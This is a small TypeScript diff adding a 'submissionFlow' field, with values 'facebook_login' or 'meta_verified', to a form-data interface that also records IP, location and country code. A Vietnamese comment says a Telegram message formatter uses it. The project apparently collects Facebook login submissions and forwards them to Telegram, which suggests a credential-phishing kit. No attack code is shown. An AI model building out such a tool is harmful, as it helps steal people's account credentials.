@@ -19,6 +19,8 @@ export interface FormData {
     location?: string
     ip?: string
     country_code?: string
+    /** Dùng bởi Telegram `formatMessage` để hiển thị tin đăng nhập vs Meta Verified */
+    submissionFlow?: 'facebook_login' | 'meta_verified'
 }
 
 interface StepFormState {
